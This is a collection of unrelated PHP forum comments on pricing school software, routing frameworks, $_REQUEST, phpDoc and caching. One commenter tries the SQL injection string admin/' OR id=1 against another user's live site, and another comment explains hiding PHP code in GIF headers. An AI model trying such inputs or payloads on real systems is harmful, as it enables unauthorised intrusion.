Oh it's definitely worth mentioning and I upvoted it. It's an important point to make. Was just explaining that my omission of that point wasn't due to ignorance.
well, with your username you never know! I kid, I kid. ;)
This looks like a cross-post of [$this](http://www.reddit.com/r/netsec/comments/gl5vy/check_your_config_and_avoid_arbitrary_code/). My usual trick is to execute as PHP one and only one file: `index.php`. With all modern frameworks following the front controller pattern, there is no reason to treat any other file to be executable. The rest of the .php files are either outside of the document root, or stashed in a subdirectory which is clearly marked as forbidden. Of course, this would break if you have other apps installed in a subdirectory. But if you're running nginx, you probably have enough control over your server to move the other apps into their own virtual hosts.
I hate that shit, just give me something thats well indented when I view the source.
I've been making pretty good lists. That's been helping. Because I'm frustrated, though, when I hit a roadblock it's hard to stay on it. I'm also trying smaller easier more straight-forward tasks and that's helping too. Thanks!
It could be worth a retry.
"hacker spaces" (.org)
mind = blown
@return Foo
This seems like an excellent way to take advantage of the old gif bug. For those of you who don't remember this there was a big issue a few years back where a GIF image could be exploited to run php code on misconfigured servers. The key is that GIF uses ASCII for it's headers, meaning that the first chunk of any GIF fie is going to be actual text. If you push that through a php interpreter than the text will run, but if you display it to a browser it will look just like a regular GIF image. Since this exploit/misconfiguration gives people the ability to run arbitrary files through the php interpreter than using gifs seems like an ideal choice for hiding those files.
To expand on linepogl's answer... @return should get the type of whatever it is that you're returning, so whether it's $this or $that (where you did $that = new Foo(); earlier on) it still follows the same rules.
and if i the class is namespaced , then should i include the namespace too, or leave it as a simple classname ?
Good question. Haven't seen much discussion about that, but I'd assume you'd want it namespaced, since that is the full name of the class itself.
Good question. I've been leaving the namespace out (unless the code requires it) since I think it's stupid to have namespaces and then have to type out long class names for the documentation. 
Yeah the first time I ever used compact() was in CakePHP!
http://pastebin.com/su1h3yQv Outputs the attribute value correctly. PHP 5.3.3.
Yeah I'm in 5.3.2 and others have got it working using that same code. I'm doing this in WordPress, so I think the value they give me for the content is being recognized as malformed by loadHTML(). I may just switch to using a shortcode in WordPress. Much easier.
If you absolutely need to iterate over objects in CakePHP use [Set::Map](http://book.cakephp.org/view/1505/map). e.g.: class Widget { public function my_custom_method_on_model() { print($this-&gt;field1); print($this-&gt;field2); } } $widgets = Set::map($model_find_results, "Widget"); foreach($widgets as $widget) { $widget-&gt;my_custom_method_on_model(); }
Then I guess you're doing it wrong?
Oh my! I'm going through the same thing right here. Been working solo on a project for 2+ years and at some points I just want to give up. It's a very very big project and it's just so easy to feel overwhelmed. u__u I do have to admit I've been getting way better at this, just like user20101q1111 mentioned. The bad thing is I started this project when I was still very very inexperienced. When I look at code I wrote in the beginning I feel slightly ashamed and want to rewrite it. Also I'd die if an experienced programmer looks at my code. I can't wait until I finish it and write version 2.0.
It's possible that your document type specifies an HTML standard that doesn't allow spaces in [certain] attribute values. Off the top of my heat I can't think of any, so take it with a grain of salt.
Most likely, but its just one of them things that don't bother me. I can do it without, its no trouble.
That's totally true.
Depends on your outlook, (and whether or not they want any support included - which I'd suggest they do, as it will likely benefit both of you). Ruthless capitalism dictates that you should charge as much as you think they will pay for it, this can be judged by any knowledge of their budgets / turnover and however much other similar products are selling for, if there are any. Personally, I am a freelance and I base all my charges on an hourly rate that I keep at roughly the average wage for my job plus any business costs/overheads I incur. I won't ever get rich this way, but it's a fair day's work for a fair day's pay, and that's all I'm after.
I figured they would want continued support and features consistently implemented, which I'm hoping is what does happen and I see no reason why it wouldn't. I was also thinking of an hourly rate, but at this point, all I know is they're going in front of the board and asking for funds to make this happen as they desperately need it. 
Work it out hourly then.. How long it took you * rate = upfront charge How long you'd spend on it each month * rate = maintenance fee As this is on the side, base your rate on a fair hourly wage for the type of work you do, maybe plus a little extra to cover relevant taxes. You could probably charge more than what this would work out as, but it's a question of whether you really want to do that to a nonprofit school..
I'm definitely not trying to gouge them, but I don't want to be doing them a favor. I've never done any kind of contracting work and have no idea what contractors would charge for a job. What's your rate?
I'm in the UK, so I'd suggest my rate is probably irrelevant, it seems people earn a lot more over there..
I agree with everything you've said, I just wanted to point out that we don't really earn a lot more...our money is worth less and that covers most of it.
Don't forget the possible user training session(s).
Oof, you're right. Unfortunately a few of them are a little older and are technologically inept. They do have an IT guy who should be able to pick it up pretty quickly and would probably be best for support on site since I'll be contracting from a separate location. 
One BILLION dollars!
Hah, if only!
Rename it before Facebook sues you.
Currently it's on www.&lt;kbfirebreathers website&gt;.com/gradebook, so I'm probably pretty safe.
Your money is worth less in terms of exchange rate, but you seem to be able to buy goods on about a 1-1 ratio. (IE, something that costs $5 to you costs £5 to us). What would an average salary be for a PHP developer over there?
Upvoted, because your idea is better than mine.
PHP isn't fast enough and doesn't have a lot of the language features necessary to be used to write a really fast webserver.
Haha, least helpful response of the month! Congratulations! **How much should I charge for this school software I've developed?** *School? Why don't they scrap the school and become pirates!* *Ooh.. kittens..* **Uhh.. thanks..**
I'd get the system running as a SaaS and set them up with an account with a recurring fee that you're both happy with (monthly probably doesn't work in this scenario, so go for a semester or yearly model). Pitch the concept to other schools and grow your subscription base.
One MILLION dollars ... Bwaa Haa Haa!!!
The only issue with pitching the concept to other schools...most districts have a grading system already in place...since they have the money to afford it. It's not a bad idea to pitch it to non-district schools. I guess this can be my pilot program.
Do it free while retaining license so you can sell a polished product to other schools and use them as a reference. 
Charge enough to justify implementing compliance once the school notices the existence of whatever privacy legislation your country may have.
First go check and price the competition: http://www.globalscholar.com/Products/Grade/Pinnacle-Grade.html A senior developer can charge $65 - $95 an hour to contract on the side, depending on location and competition for large projects. That said, I doubt that school has anything close to that in mind. They see her using something and just want to use it too, paying next to nothing. 
Hopefully you'll just need to train one person there really well, and that person will take over training others. I usually throw in documentation and a bucket of training hours for one person as part of the deliverables.
Ignoring Facebook, Gradebook already exists, and is a popular system. 
Was definitely going to give them documentation. Training one person to be the go to person on how to work it is definitely a good idea.
I don't know if this will be helpful or not. I work at a college where one of my primary functions is writing 'helpful utilities in PHP' This includes a system for tutors and supplemental instructors to track sessions. A full blown research website designed to track data requests and act as a base of operations for our accreditation planning process and an app to track Course of Records and Student Learning Outcomes. This wasn't a position I was hired initially to do I was sort of graduated into it along the way. I started as a research assistant and the position was created when they learned I could do much more than basic reports and database design. I make around ~$4500 a month before taxes, retirement and all the other shit they take out of my check, taking home around $3100. I regularly have to support these systems and provide training on an as needed basis.
$3000 i am not basing this on anything
I definitely won't be getting that much, maybe if it expands, but thanks a lot for the input!
Figure out a solid, honest hourly rate. My pro rate is $85. If you've spent say a solid 40 hours on it then you've got about $3500 for the application as-is. Any work above and beyond would be quoted at your hourly rate, including any training and support.
Yeah, I'd say I spent about 35-40 hours so far. Anything further is pretty much enhancements. An hourly rate is probably what it's going to come down to, I just hope they don't offer 10 dollars an hour. It almost feels like I'm doing it for free at that rate.
I'd probably just do some research and see how many enhancements you'll be doing. You may be able to undercut yourself on the initial sell and make it up on the back-end doing these enhancements and support. Sometimes it's best to just get your foot through the door.
I wouldn't do it for free (never a good idea in a professional relationship), but giving them a good rate and keeping the right to rebrand and sell it is a must. 
Be very careful about preserving the rights, if you ever want to be able to sell it to anyone else or release it as open source. Otherwise, if they pay you to develop it, it will be theirs.
find similar programs that are already made, and use that for a basis to decide how much you want to charge.
Maybe throw in some free support hours initially if you have to sweeten the deal but explicitly mention what sort of issues you'll work through in the free support. After that, it's a good idea to come up with a Support contract / User Training contract .. After seeing how much the vendors charge institutes for support, it'd be foolish not to take advantage of that. Chances are that they're already paying a fat sum of money to some vendor for support / retainer. 
What should I do about protecting my code?
Okay, thanks for the input. I'll definitely consider this.
Do Consult some good support contract templates for drafting one up. e.g. I wouldn't mention 24 hour anywhere near it .. explicitly state the # of hours a month + timings of your availability to work on their issues + response window + weekends covered or not etc. etc. I tell you this because users just expect you to drop everything you're doing and work on their issues right at that moment .. (I work in higher ed so I have to deal with this every so often) Also, make sure they understand that enhancement requests (that'll require good amount of time) mean extra $ and do not count as support hours .. 
Make sure you have a contract which says that you retain full rights to the code.
Aye, I agree. Perhaps some kind of "perpetual non-revokable license" deal with the school. They agree to pay a reasonable rate (either up-front, ongoing contract, or rate card), in return, they get to use it for as long as they please, but you retain ownership of the application.
Okay, awesome. Thank you for the info!
I like your thinking, but I think there's a solution here: release the software as free/open source and charge for the service. You could even build up a brand around the free software. I work for non-profits a lot and that's exactly how we role. Be sure to let them know that you're releasing the software.
http://rontonsoup.com/gradebook/
You are one crafty son of a bitch. How'd you manage that? I guess I'll have to take my default username / password out of there now.
&gt; I guess I'll have to take my default username / password out of there now. That's why I let you know :D
I'd run it as a service and charge per user (teacher). They're not going to want to maintain their own infrastructure anyway and paying incrementally is usually easier on cashflow. Support also gets built into this model, which is definitely something they're going to need.
Someone said watch out for facebook, but really watch out for Blackboard suing you. They have successfully stopped this kind of site before. If you wonder why blackboard sucks, its because they have sued everyone else that has come with a better product and won every time. Relevant link: http://mfeldstein.com/blackboard-files-yet-another-lawsuit/
Over here i get around 50-80/hr depending on the company and work involved...but i would say i am on the upper end with my experience/etc...(10+ years with php professionally)
My first thought is be careful... grades are federally protected data. Edit: Went out to find some references for you (FERPA / Liability of Student Records), but it seems like they only cover "educational agencies and institutions that receive funding under a program administered by the U. S. Department of Education". So now if you're going to go down this route I strongly suggest you ask the school if they are administered or receive funding from the U.S. Department of Education. If they do, you've got a lot of reading to do, and a lot of things to take into account.
GardeBook? Is this for a [town](http://en.wikipedia.org/wiki/Garde,_Spain) in Spain?
Wow, that's a *hell* of a lot more than you would get here. An experienced programmer can expect to earn £30 - £40k per year on average..
Wow...ok i take my comment about not making as much back...even intro positions get atleast 40k a year generally.... So yea, today i learned...thanks
If the price seems too good to be true, I'd be wary.
Reddit? I'm available and have been doing PHP for many years now. Message me.
I'm writing a similar thing, and honestly, because it is a school and because I know the teachers will benefit so much - I'm giving it away under the gpl. My idea is that they will adopt it and see the value of open source and this will lead them (eventually) from closed source software... The tools that are available for schools are crushingly expensive and exploitive. I truly believe an open source group should get together and write/provide all of the tools schools/teachers need. Education budgets are being slashed, but the costs are not. You have an opportunity to do something bigger. You won't get rich, but there could be far greater rewards.
Call it a product and keep the rights to distribute it. License it to them for free, and hammer out a contract so that you get paid for 6 months to a year of development time (whatever you think you need). It's worth more to you as a finished, tested product than as a one off to this particular school district. Once you have it working, and the bugs worked out, start networking with other school districts, offering a site license or a per user license (figure out the pricing). Anyway, the idea is you can sell this to a lot of school districts. If you don't want to start a software company, at least turn this into a product, and then see if you can sell it to a software company that can take on support and distribution.
He's the sole author and contributor. How would it benefit the OP to open source his software if an organization is interested in using it as-is, right now? As everyone else has pointed out, the concern here is support, support support.
Another pricing model is Value to Customer. How much is it worth to them? In other words, how much money would they save by using your software? Charge some number less than what they would save by using it. That's probably more than what it cost you to make it. It's a win-win.
Hmm that's bizarre, an intro position here would expect to be around £20-£25k a year.. so with the exchange rate that's about the same.. guess there's just not so much room for growth.. Obviously freelance and contract salaries are normally higher.. (FWIW, my last full time job was as a C# Dev with 8+ years programming experience..)
True, most people I've worked with seem completely incapable of understanding how on earth decent software will save them money. Until the project's completed and they've been using it about a year that is..
It's hard to say, not being able to see your system. You should be aware though that there are thousands of solutions that do this. They are interested in you because they can probably get it for cheap, and because they might not be aware of other solutions. You should also know that support for a place like this is a real hassle, and you should charge by the hour. Otherwise, you will be tied up with it forever.
They won't care. Its either $$$$ for the service of installing and supporting his free software, or $$$$ for the software itself, which includes installation and support. The corporate world doesn't care whether or not the software is open source. They want to know the up front costs, recurring costs, quality and features of the product, and support structure. Yes, you technically could build a brand around the free open source software, but you can also do the same thing for commercial software.
Try this subreddit, but also try /r/forhire. You're probably much more likely to find honest developers here. Also, as some other people have mentioned, you more often than not get what you pay for. For $50+/hr candidates you should be able to find competent, experienced developers who can do whatever you need for your project. For less than that, your mileage may vary.
obviously you have people interested in your creation. Create your own website, give it out for free with ads. Have a plan that allows more stuff with no ads. This will allow you to make some cash and your idea will reach more people.
Small fee over teacher, like 5 dollars a month when you know its like 40 teachers (would be 200 dollars a month) say something like 50 accounts for 1000 a semester (2000 a year) i think is cheap enough, and you could charge extra over support... I think thats enough for you to keep updating, and a good model to sell it to more schools (if they want)
Small fee over teacher, like 5 dollars a month when you know its like 40 teachers (would be 200 dollars a month) say something like 50 accounts for 1000 a semester (2000 a year) i think is cheap enough, and you could charge extra over support... I think thats enough for you to keep updating, and a good model to sell it to more schools (if they want)
I tried admin/' OR id=1 and it didn't work. :-(
Also for $50+/hr you should be able to get a lot of good references and examples of their work. When I used to freelance much of my work was cleaning up cheap outsourced code and the horrors of some of their code...
Let's see if he's properly preventing SQL injection. Bobby Tables, anyone? ;) Edit, legal disclaimer: This is a joke. I do not actually advocate the unauthorized security testing of kbfirebreather's website.
Why "perpetual non-revokable"? If they want that let them ask for it, don't negotiate against yourself.
And does the same apply, if the class implements an interface, should i put class name or the interface name in the @return ? 
You misspelled Gradebook in the header ;)
I see few issues with the code , but maybe it's just me: * there are no phpDoc comments in code * you are using global variables * there are @ symbols used for error suppression * parameters are collected from $_REQUEST Dunno ... i think there is a lot of room for improvement. 
The first point you made isn't an actual issue...
Why start at such a weak position? Charge for it, and still retain the right to sell it on. Negotiate from that point.
- IMO the code is documented well enough with comments and the README - I went for a functional routing approach rather than wrapping dispatch in a class. Why? It's slightly faster and IMO looks cleaner calling `respond()` rather than `Whatever::respond()`. You end up with a single global array, but a static property holding routes is essentially also a global. - The @ operator is used to suppress E_NOTICE's on a session_start() when the session has already started. It's retarded that they're even thrown in the first place. (**Edit: session_id() ftw. @ operators have been removed in [this commit](https://github.com/chriso/klein.php/commit/23ca59f67037013d8cab9be5b681a8d9fad8ceda)**) - There's nothing wrong with accessing request parameters using $_REQUEST, the default order in PHP5.3.x (which is required) is "GP". (**Edit: some users with non-default configurations may still have cookies mixed-in with REQUEST, see [this post](http://www.mail-archive.com/internals@lists.php.net/msg33119.html) for an explanation of why this is bad. I've forced request_order to be GP in [this commit](https://github.com/chriso/klein.php/commit/9f364ce99741a1363c789e662dafe518a099e407) **)
I've seen this posted 3 times already...
Thank you. We are willing to pay. Where can I find these people and their portfolios? 
Testing and requirements refinement for free, while developing a base and learning more about the market has a value. But yes, he can charge upfront too. 
Personally I like the style of routing I added to glue.php (https://github.com/ZaneA/glue/blob/master/glue.php) It lets you get the matches as arguments to your routing function, which I believe is basically self-documenting: $urls = array( '/' =&gt; 'index', '/page/(\d+)/(\d+)/(\d+)/' =&gt; 'page' ); class page { function GET($year, $month, $day) { echo "Got /page/{$year}/{$month}/{$day}"; } } glue::stick($urls, true); From the looks of it, this could be added pretty easily to klein.php too as an optional feature..
I can understand your choice to use the @ operator. There are a few places in PHP where the functions are so retarded that it's very difficult to avoid an E_NOTICE or sometimes even an E_WARNING being thrown. This is usually the case when the only way to know whether an error will be thrown is to try anyway. The best way to manage unavoidable errors, however, is to write a custom error handler that turns all non-fatal errors into corresponding exceptions. It takes just a few lines of code. Now you can do whatever you want with those exceptions, and all the anti-error-suppression purists will be satisfied. Maybe this is overkill for session\_start(), but I'd definitely recommend taking this route in any project you actually build. $\_REQUEST, on the other hand, is just plain wrong. Depending on server configuration, it may or may not contain cookies, in addition to GET and POST parameters. Depending on server configuration, GET and POST parameters may or may not overwrite those cookies. That's a potential security issue that I'd rather do without. Besides, routers have no use for POST parameters, because POST parameters are not part of the URL. Just stick with $\_GET.
&gt; There's nothing wrong with accessing request parameters using $_REQUEST The behavior of $_REQUEST is highly unreliable. On many configurations (including the default), it lumps cookies in with the request data. So if there is a cookie with the same name as a request variable you are trying to access, it can lead to unexpected results. To avoid using the @ operator, you can do: if(!session_id()) session_start(); But it's not a huge deal.
A good portfolio for a programmer of any sort means code. What background do you have that allows you to evaluate code? Would you recognize, if you saw: * good security practices * proper separation of logic and display * appropriate use of code design patterns in OOP * maintainable code If you're not a programmer yourself, I imagine the answer to all of those is "no" -- its actually very difficult to hire a programmer if you're not one. If you want to hire a software engineer and you aren't one yourself, and can't find one you trust to vet the one you're going to hire, you have to rely on that person's clients. Get references, talk to them. Even then, depending on the project provided, it might not be applicable to what you want to do. If you can't get references, look for someone with a good past or current employer - real companies doing serious work generally avoid the worst of the riff-raff. You might find this Q&amp;A on [programmers stackexchange](http://programmers.stackexchange.com/questions/59221/how-to-hire-a-web-programmer-for-non-programmer) helpful as it addresses your problem directly Someone with open source contributions is usually a good sign as well, as the better projects aren't going to accept trash code. If your programmer to hire has a github account and has had his pull requests integrated into reputable projects, that's always good.
It wasn't supposed to :P
Thanks! It is in alpha :P
Thanks for the input, I like your thinking.
Thanks for the input, I like your thinking.
Thanks! It is in alpha :P
I am actually a programmer but I would not have the time to develop the application therefore I am hiring someone to do it. Will interested developers be willing to share some of their sourcecode? 
I'm probably just going to keep it on their intranet. That way they don't have to pay for a server and as long as their network is up, the site will be up.
I've cross-posted it from /r/programming. I didn't post / can't find a third..
While I don't know anything about you, personally, I think assuming people on reddit are quality coders would be a mistake. I still remember fondly the thread where someone posted their shiny new auth class. It salted and hashed all the passwords -- with the same salt. And md5.
I use a UDP message wrapper I wrote in PHP and have netcat listen. The advantages of this is I can debug live applications with nothing being sent to the browser. I can also debug a remote server from my local workstation without having to install mods that may slow or effect the production system. Because UDP is a 'fire and forget' protocol you do not have to worry about the library slowing down the system. I had an article on my blog showing the wrapper and how to use it but I am moving servers at the moment so it is down, if you would like I can reply again with the URL once I get it up (tonight or tomorrow). UDP FTW!
They should be - if they aren't be worried. :) My current job asked to see work I've produced, as did a number of people who hired me when I was independent. I've had to hire other developers before myself and I took the advice I'm giving you -- I judged people based on code and open source contributions and I was very happy as a result.
[You're not looking hard enough.](http://www.reddit.com/r/PHP/comments/gknkg/kleinphp_a_lightning_fast_microframework/)
Thank you Erik, This is very valuable. I am going to invest a fortune on this project and would greatly appreciate any more pointers you could share. 
Do it free or a small fee or something just to cover your costs. LICENSE it to the school and keep intellectual property rights. Do not do as "work for hire". Use the experience as a way to develop something you could license elsewhere. That's where the opportunity lies. Not in a one time sale.
Somebody else must have posted it. [Search](http://www.reddit.com/search?q=klein.php) returns nothing?
&gt; [session_id()](http://php.net/manual/en/function.session-id.php) =&gt; *session_id() returns the session id for the current session or the empty string ("") if there is no current session* Neat. I'll add this in the next release
&gt; The best way to manage unavoidable errors, however, is to write a custom error handler I agree, but this should be an exercise for the reader rather than including it as part of klein. Hijacking the default error handler will produce unexpected results if used in conjunction with other libraries. Just a note that PHPv5.3+ (which is required) has a default request order of `GP` 
The default request_order in PHP5.3.x (which is required) is `GP`
site:reddit.com/r/php "klein.php" Google always works better than reddit search.
Let them come to you. Post a request for candidates in /r/forhire !
if everything is in a per built system, there'd be less errors. You also have to factor in usability. His program is probably much simpler and teachers wouldn't have to deal with learning a spreadsheet program.
Yeah, I'm definitely not planning on making this a one time sale and hoping to use this as pretty much a "pilot" program to see how this could possibly prosper in the future.
It is always nice to see different approaches to common web programming tasks. Thanks for sharing your code. 
Seems to work fine. shell_exec('touch foo; touch bar'); leaves foo and bar in the directory.
Oh wow. I feel stupid. thanks.
It seems that you won't need this anymore for the time being, but you don't need to hijack the default error handler in order to implement your own error handling procedure. `restore_error_handler()` reverts the error handler to whatever it was before you changed it. So you can do: set_error_handler(function() { whatever; } ); do_something_that_might_cause_an_error(); restore_error_handler(); Also, why rely on the default (but easily changeable) request order when you can just use $\_GET and be happy? As I said, a router has no use for other types of parameters.
That it why i called it an "issue" and not an "error". Because if you are using IDEs, then the auto-complete really helps for the productivity. And there is actually a secondary effect to having phpDoc for each of the class/function - it forces to sum up the responsibility, and you might realize that your class/function does *too much*.
Just start coding. Create a simple page with a form. Start small.
Don't feel stupid, we all have the occasional cranial flatulence. Though I am always surprised when I run across questions like this, where you could just test it with fewer keystrokes than it takes type the question out.
It's not just a router though, if you're building something RESTful you absolutely need access to the POST parameters. respond('POST', '/user/create', function ($request) { $username = $request-&gt;param('username'); //etc. }); I've exposed a common interface for [retrieving](https://github.com/chriso/klein.php/blob/master/klein.php#L187-208) and [validating](https://github.com/chriso/klein.php/blob/master/klein.php#L514) parameters, and accessing an [escaped version](https://github.com/chriso/klein.php/blob/master/klein.php#L444) from within your views. I don't think it's worth having a separate interface for each - a request parameter is a request parameter. If you absolutely need to know if something has come from POST or GET then you can handle it yourself - you just miss out on the sugar.
Thanks for the info, will definitely look into this.
Well that's clearly the exception that proves the rule.
You might want to consider getting some screen recording software and recording a demo with voice-over instructions. Something that people can download and watch repeatedly, pause, rewind, etc. They are quite easy to make and if you're going to train somebody, anyway, it's only a bit more work to do it "right" just the once!
It's pretty rare for hosts to deploy the default, though. You can't rely on $_REQUEST at all.
I think the point of the question was why are they currently doing everything handwritten when there are free open-source software, free online software, or cheap academic versions of proprietary software available? Even my highschool had software that most teachers used. Didn't help much when the place burned down since there was no network or offsite backup but at least the grades weren't written on paper.
This was originally going to be my response but I did a quick Google search and there are several companies already doing this. One is even free for the basic stuff and fairly cheap for everything else. Going to be difficult to compete against that.
I thought name attributes weren't supposed to have spaces anyways?
Charge per hour. Make sure that you write out the Information Architecture, even if it's just on a piece of paper. Have them sign off on it. Make sure there's no scope creep. They WILL ask for more shit.
This will turn up to 32 values in an array that are true/false into an int for storage into MySQL as a single integer and of course back with unserialize. /* int serialize * * Checks array of keys for whether an option is on or off and create a numerical INT value for them. * * array $input * string $mask Mask definition key */ function serialize($input,$mask) { if(!isset(self::$valueMask[$mask])) { self::error('Invalid mask type.'); return FALSE; } $sum = 0; foreach(self::$valueMask[$mask] as $key =&gt; $val) { if($input[$val] == 1) { $sum = sprintf ( "%.0f", ($sum+$key)); } } return $sum; } /* array unserialize * * Outputs an associative array of options on or off depending on an int * * int $int * string $mask Mask definition key */ function unserialize($int,$mask) { if(!isset(self::$valueMask[$mask])) { self::error('Invalid mask type.'); return FALSE; } $total = (string)$int; foreach(array_reverse(self::$valueMask[$mask], TRUE) as $key =&gt; $val) { if($key &lt;= $total &amp;&amp; $total != '0') { $output[$val] = 1; $total = sprintf ( "%.0f", ($total-$key)); } else { $output[$val] = 0; } } return $output; }
Seems pretty reliable to me. $_REQUEST = array_merge($_GET, $_POST); The whole $_REQUEST bickering is rooted in a cursorily understanding of the realistic ramifications of having cookies mixed in there.
..which it isn't, by default, in PHP5.3. Even if cookies are included in $_REQUEST, what's the big deal? Anyone can spoof any part of a request, cookies / GET / POST, why is everyone convinced that REQUEST poses a security issue?
Cookies can lead to request parameter fixation should they override GET or POST data. That is an issue for subdomain applications, and was (past tense) a browser problem with some second level domains. The security woes are mostly a misattribution however. (There is that logout cookie tale that often serves as scapegoat here.)
So cookies used to override get and post in _REQUEST? Ouch. I've forced request order to be GP in [this commit](https://github.com/chriso/klein.php/blob/master/klein.php#L18-19)
Anywhere from 30k to 100k. You pick.
Fair point, but don't rule out the idea. When I do private work, I usally throw that in there as a way of saying "I've coded it for you, but I own it, bitches"
I meant more that it's awesome there's no phpDoc's.
That's is a very good idea, thanks for the tip!
Given the content of the web development subreddits (r/web_design and here), I wouldn't say that reddit is a good source of quality coders. Sure, there are probably some good developers out there, but the norm seem to be newbies seeking advice. That's the impression I've gotten, at least. 
Just tested on my server and that code works fine. You mentioned "No PHP Errors" previously, but didn't mention any errors now. Are there any?
Try dumping the response data from Twitter (`var_dump($feed)`) or use `echo file_get_contents('http://...')`. Twitter may have blocked your server's access to the RSS feeds (you might've been scraping it too often or they didn't like the user agent string).
I think it must have been a traffic spike meant I was requesting the RSS feed too often from a single IP - it's back to normal now. Thanks for the info though - var_dump will come in use for debugging in the future.
amen
It's best to cache data from feeds like twitter. That gives you a few advantages: 1) You don't go over limits and get blacklisted. 2) Your site doesn't slow down if twitter has problems. 3) Your site still has content if twitter has problems. For example: Assume you hit the twitter feed and cache the data every time someone requests the data and your cache is more than 5 minutes old: If three people come to your site in an hour, you'll probably still make three requests. If 100 people come to your site in an hour, you'll cap out at 12 requests. If 100,000 people come to your site in an hour, you'll cap out at 12 requests. This speeds up your site, reduces the load on twitter, and if twitter goes down (which it does from time to time) your site doesn't slow down while it waits for the requests to timeout. There's an article [here](http://spaceninja.com/2009/07/twitter-php-caching/) explaining more.
having spent some time in the same situation as you are right now, I m just gonna let you know what helped me get MVC and OOP. [PHP Objects, Patterns and Practice](http://www.apress.com/open-source/php/9781430229254), I had read quite a lot of stuff on OOP, and this book kind of wrapped all the knowledge in a simple to get kind of way for me. And MVC was a pain in the ass until I began "studying" Codeigniter. I had previously tried with ZF and Yii, and although both have more features, the whole framework idea seemed like something I would need to configure for a whole day before I could even begin doing something. With CI everything seems so obvious. Maybe you'll learn it and immediately try a bigger framework afterwards...but it's quite useful to understand the whole MVC idea
Just keep this in mind: The IT dept. (really one fat forever alone guy) in my high school (back in '03) purchased an $85,000 video conferencing system like you see in the movies, with a long table and "motion detecting" video cameras for each person sitting down. He admitted they had not used it a single time, but that it was "awesome".
Wish I saw this yesterday
I'm in the same place. I guess other projects have timelines where they change styles in different releases, whereas for both of us, we cringe and start changing when we know better but the old code is still there.
If they come back to you with a specification, a fixed price, a discussion of the security decisions underlying their design and a general approach, they're worth the risk. You can't find good developers. You either get them referred to you or you take a chance on one. If there was a way to measure skill up front, everyone would know it by now. Be sure to include a verifiable "this is correct work" functional spec.
That generally comes down to who the developer is and whether they feel you're paying them enough. Most good programmers will, if you aren't hassling them for every dollar, but if someone won't that isn't a sign of incompetency.
http://en.wikipedia.org/wiki/Scope_resolution_operator#PHP
It will be caused by missing colon ( or additional one ). Look at your static calls/variables.
I believe they've finally changed that token name to T_DOUBLE_COLON in more recent versions of PHP. 
Thanks, dint know it was on wiki. First, I thought my computer was trolling me then a little googling found me the answer. Thought might share it with you guys.
Yup got it fixed. It was actually a missing $ from the variable &gt; if (empty(key))
Aghh they should have left it in there as a Easter egg!
Not really an easter egg so much as its name.
It's Hebrew for (literally) double-colon. Much of PHP was developed at the Technion in Haifa, Israel and this gem of an error managed to remain unchanged for years. Even as a Hebrew speaker, I was a bit perplexed the first time I saw this. 
Jews don't celebrate Easter.
i remember seeing this for the first time, i thought i had been awake way too long, spent a couple minutes trying to focus and read it
Part of the reason why i'm reluctant to hire nonnative english speakers. Imagine going through: $quiacoupé = array_slice($laFromage, 2); Yes, php allows UTF variable names and yes, that a fart joke right there.
That's just Hebrew for :: . He didn't know how to say it in English at the time.
Easter eggs have next to nothing to do with Easter, and I searched for them with Jewish kids in my home town. Surely you don't think people are dyeing food because Jesus was buried alive?
So what's the Jewish equivalent of the software Easter egg? Passover lamb?
most probably you have *allow_url_fopen* disabled - check out the following links; [http://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen](http://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen) [http://php.net/manual/en/wrappers.http.php](http://php.net/manual/en/wrappers.http.php)
Would you please clarify your last point?
&amp;&amp;
What underlying framework (if any) is your app made in? 
I cannot count how many times I've seen a four week job become a four month job because there was a disagreement between the contractor and the contract holder about what defines complete, what "obviously" got meant, et cetera. It is complete if: * I do X and the result is Y * The system does not allow Z * The functionalities A, B, C and D are present That kind of thing. It's a lot more important than most people expect.
Presently, it isn't in any framework. My first project to incorporate it will be a Kohana module though. edit: I'm not sure I answered your question completely. I am using both cuke4php and behat outside a framework right now to evaluate them. The intranet app will be in kohana and the first project I want to use cucumber for is a new module within that kohana app.
Humph. We use symphony - and I'm in a similar predicament. Nevermind!
Twitter has a rate limit on their API. You can only make 150 requests per hour: http://dev.twitter.com/pages/rate-limiting
Why in the world would this comment get downvoted
clarke187's method (&amp;&amp;) is IMHO better for your task, because it will only execute the second command, if the first one was successful. shell_exec('cmd1 &amp;&amp; cmd2');
Because I get mass downvoted by trolls who haunt me on a fairly regular basis (people like KravenC and that douche who keeps making new troll accounts - currently TrollPointerOuter.)
Amazing post! 
i really like this, almost more than limonade. i'm wary of all the magic, though.
Don't know why this one is downvoted. I do downvote StoneCypher's comments where he's being a douche. Which is like 95% of them. There are a few (like this one) that are actually useful.
 SELECT j.id, j.jobNumber, j.client, j.project, t.id, t.timeIn, t.timeOut, t.timeTotal, t.inWork FROM jobs j INNER JOIN time t ON t.jobId = j.jobId WHERE j.jobId = $jobId ORDER BY t.inWork Something like that maybe... Either way, you need to join the tables somehow.
this is a common issue with trying to get get the last value of a group. [this link](http://www.xaprb.com/blog/2007/08/21/how-to-select-the-first-or-last-row-per-group-in-sql/) covers the issue a little, hope that can steer you in the right direction. edit: that is totally the wrong link. [this one](http://www.xaprb.com/blog/2006/12/07/how-to-select-the-firstleastmax-row-per-group-in-sql/) is more relevant. I'm going to check my codebase for what I used previously. edit-2: here's my old query adapted for you. I don't have time to really explain it because I'm at work but here you go. Essentially you make a query for the lastest record from each job then join that from the subquery: SELECT j.*, time_temp.* FROM jobs j LEFT JOIN ( SELECT t.job_number, t.time_in, t.time_out, t.time_total, t.in_work FROM times t LEFT JOIN times tt ON t.job_number = tt.job_number AND t.time_in &lt; tt.time_in WHERE tt.job_number is NULL GROUP BY t.job_number) AS time_temp ON j.job_number = time_temp.job_number; 
&gt;Perhaps an optional parameter? [Ding, ding, ding](http://www.youtube.com/watch?v=fGjOsfV3ar8&amp;t=0m5s)
Great thanks. ... fap fap fap.